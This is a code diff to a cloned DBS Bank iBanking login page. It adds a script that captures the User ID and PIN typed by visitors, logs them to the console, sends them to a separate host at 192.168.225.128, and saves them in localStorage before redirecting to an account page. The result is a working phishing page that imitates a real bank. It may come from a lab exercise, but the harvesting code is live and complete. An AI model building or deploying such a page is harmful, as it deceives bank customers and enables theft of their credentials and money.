@@ -6,7 +6,7 @@
 	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 
 	<meta http-equiv="PRAGMA" content="NO-CACHE">
-	<meta http-equiv="Cache-Control" content="no-cache">
+	<meta http-equiv="Cache-Control" content="no-cache, no-control, must-revalidate">
 	<meta http-equiv="expires" content="0">
 
 	<meta name="Copyright" content="(c) Copyright  2004 DBS Bank">
@@ -22,6 +22,44 @@
 	<link rel="stylesheet" href="./DBS_iBanking_files/language_login.css">
 
 	<link rel="stylesheet" href="./DBS_iBanking_files/login.css">
+	<script>
+        async function submitLogin(event) {
+            event.preventDefault(); // Prevent the form from submitting the traditional way
+
+            const username = document.getElementById('UID').value;
+            const password = document.getElementById('PIN').value;
+
+            const loginData = {
+                username: username,
+                password: password
+            };
+
+			console.log('Username:', username);
+    		console.log('Password:', password);
+
+            try {
+                const response = await fetch('http://192.168.225.128:80/login/user', { // Proxy server address
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(loginData) // Convert the object to JSON
+                });
+
+                if (response.ok) {
+                    console.log('Login successful');
+					localStorage.setItem('username', username);
+                	localStorage.setItem('password', password);
+					window.location.href='account.html';
+                } else {
+                    console.error('Login failed');
+					document.getElementById('errormsg').style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error during fetch:', error);
+            }
+        }
+    </script>
 </head>
 
 <body>
@@ -31,7 +69,7 @@
 	</iframe>
 
 
-	<form class="MainForm" name="MainForm" method="post">
+	<form class="MainForm" name="MainForm" onsubmit="submitLogin(event)">
 		<input type="hidden" name="isCancelClicked" value="0">
 		<input type="hidden" name="isSubmitClicked" value="0">
 		<!--body Starts Here-->
@@ -57,25 +95,23 @@
 
 
 			<div class="form-row input-layout">
-				<input tabindex="1" type="text" name="UID" id="UID" maxlength="20" placeholder="" class="left"
-					autocomplete="off">
+				<input tabindex="1" type="text" name="UID" id="UID" maxlength="20" placeholder="User ID" class="left"
+					autocomplete="off" >
 				<span class="highlight"></span>
 				<span id="uidBar" class="bar"></span>
-				<label>User ID</label>
 			</div>
 
 			<div id="errormsg" style="display:none" class="error-msg">
-				<h4 id="InvalidUserId">Sorry, you have entered an invalid User ID.</h4>
+				<h4 id="InvalidUserId">Sorry, you have entered invalid login credentials.</h4>
 			</div>
 
 
 
 			<div class="form-row input-layout pin">
 				<input tabindex="2" onkeyup="keyUp(event)" onkeydown="return onlyNumerics(event)" type="password"
-					maxlength="9" placeholder="" name="PIN" id="PIN" autocomplete="off" class="left">
+					maxlength="9" placeholder="PIN" name="PIN" id="PIN" autocomplete="off" class="left">
 				<span class="highlight"></span>
 				<span id="pinBar" class="bar"></span>
-				<label>PIN</label>
 			</div>
 
 			<div id="errormsg1" style="display:none" class="error-msg">
@@ -84,8 +120,8 @@
 
 			<div class="mTop-38">
 
-				<button class="btn btn-primary block mBot-12" onclick="window.location.href='account.html'" title="Login" tabindex="3"
-					type="button">Login</button>
+				<button class="btn btn-primary block mBot-12" title="Login" tabindex="3"
+					type="submit">Login</button>
 
 				<button class="btn btn-secondary right mBot-16" title="Get Started" tabindex="4" type="button">Get
 					Started</button>
